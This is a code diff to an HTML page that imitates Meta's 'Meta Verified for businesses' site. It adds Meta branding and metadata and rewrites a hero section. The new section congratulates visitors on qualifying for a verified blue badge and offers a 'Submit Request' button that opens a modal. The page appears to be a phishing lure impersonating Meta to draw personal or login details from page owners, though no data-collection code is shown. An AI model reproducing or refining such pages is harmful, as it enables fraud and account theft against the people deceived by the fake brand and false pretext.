@@ -4,8 +4,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Verified - Rewards for you</title>
-    <link rel="icon" href="./public/favicon-32x32.png">
+    <title>Meta Verified for businesses</title>
+        <meta name="description"
+        content="Show the world that you mean business with Meta Verified. Gain access to the verified badge, impersonation protection, account support and tools to help you engage more efficiently with your customers." />
+    <meta property="og:title"
+        content="Meta Verified for businesses | Verify your business on Facebook, Instagram and WhatsApp" />
+    <meta property="og:description"
+        content="Show the world that you mean business with Meta Verified. Gain access to the verified badge, impersonation protection, account support and tools to help you engage more efficiently with your customers." />
+    <link rel="icon" href="./public/favicon.png">
     <link rel="stylesheet" href="./public/styles/style.css">
 
     <!-- Tailwind CSS CDN -->
@@ -72,35 +78,35 @@
                 <img src="/public/meta/ic_search.svg" class='w-[20px] h-[20px] cursor-pointer' alt="user" />
             </div>
         </div>
-        <!-- NAVBAR END -->
-
-        <!-- HERO START -->
-        <div class='flex md:flex-row flex-col w-full items-center justify-between'>
-            <div class='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
-                <div
-                    class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
-                    <img src="/public/meta/ic_blue.svg" alt="meta"
-                        class='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
-                    <h1 class='md:text-[48px] text-[32px] font-[500] font-bold mb-4 order-2'>Show the world that you
+    <div class="bg-white">
+        <div
+            class="flex md:flex-row flex-col w-full items-center justify-between md:max-w-[1440px] mx-auto md:px-6 px-3 md:py-16 py-10">
+            <div class="md:w-[40%] w-full flex items-center justify-start md:order-1 order-2 md:pb-0 pb-10">
+                <div class="md:max-w-[480px] max-w-[100%] w-full flex flex-col items-start justify-start">
+                    <img src="public/meta/ic_blue.svg" alt="meta"
+                        class="order-1 md:w-[72px] w-[48px] md:h-[72px] h-[48px] mb-6">
+                    <h1 class="md:text-[48px] text-[32px] mb-4 order-2 leading-[1.15]" data-i18n="hero.title">Show the
+                        world that you
                         mean business.
                     </h1>
-                    <p class='text-16px text-[#1c2b33] font-[300] md:order-3 order-4'>Congratulations on achieving the
-                        requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that
-                        reflects your dedication and the trust you&apos;ve built with your audience.</p>
-                    <p class='text-16px text-[#1c2b33] font-[300] md:order-4 order-5'>We&apos;re thrilled to celebrate
-                        this moment with you and look forward to seeing your page thrive with this prestigious
-                        recognition!</p>
-                    <button id="btn-submit-request"
-                        class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Subscribe
-                        on Facebook</button>
+                    <p class="text-[16px] text-[#1c2b33] font-[400] order-3 mb-6 leading-[1.5]"
+                        data-i18n="hero.subtitle">Meta Verified helps you
+                        build more confidence with new audiences and protects your brand.</p>
+                    <button id="btn-submit-request" data-i18n="hero.button" onclick="showModal('modal-info')"
+                        class="order-4 bg-[#0064e0] text-white px-10 py-[16px] flex items-center justify-center rounded-[45px] font-[700] text-[16px] cursor-pointer hover:bg-[#0056c7] transition-colors">Submit
+                        Request</button>
+                    <p class="order-5 text-[14px] text-[#465A69] font-[400] mt-4 leading-[1.5]"
+                        data-i18n="hero.congrats">Congratulations
+                        on
+                        achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic
+                        milestone that reflects your dedication and the trust you've built with your audience.</p>
                 </div>
             </div>
-            <div class='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[200px] overflow-hidden'>
-                <video src="/public/videos/video-meta.mp4"
-                    class='w-full h-full object-cover block md:h-full h-[300px] w-full' autoPlay muted loop></video>
+            <div class="md:w-[60%] w-full overflow-visible md:order-2 order-1 flex items-center justify-end md:-mr-6">
+                <video autoplay loop muted playsinline class="w-full block" src="public/videos/video-meta.mp4">
+                </video>
             </div>
         </div>
-        <!-- HERO END -->
 
         <!-- META BENEFITS START -->
         <div class='max-w-[1175px] mx-auto md:pt-20 pt-6 px-6 md:mb-0 mb-10'>
